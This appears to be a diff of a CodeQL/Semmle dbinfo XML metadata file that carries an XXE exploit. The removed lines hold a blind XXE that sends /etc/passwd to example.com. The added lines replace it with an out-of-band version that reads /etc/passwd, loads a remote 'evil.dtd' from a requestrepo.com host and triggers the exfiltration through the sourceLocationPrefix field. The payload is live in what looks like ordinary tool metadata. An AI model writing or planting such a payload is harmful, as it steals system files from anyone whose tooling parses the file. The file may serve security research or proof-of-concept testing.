@@ -1,10 +1,13 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE foo [
-<!ELEMENT foo (#ANY)>
-<!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM
+  "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM
+  "http://krhelbvr.requestrepo.com/evil.dtd">
+  %dtd;
+]>
 <ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
-    <sourceLocationPrefix>&blind;</sourceLocationPrefix>
+    <sourceLocationPrefix>&send;</sourceLocationPrefix>
     <baselineLinesOfCode>420</baselineLinesOfCode>
     <unicodeNewlines>false</unicodeNewlines>
     <columnKind>utf16</columnKind>
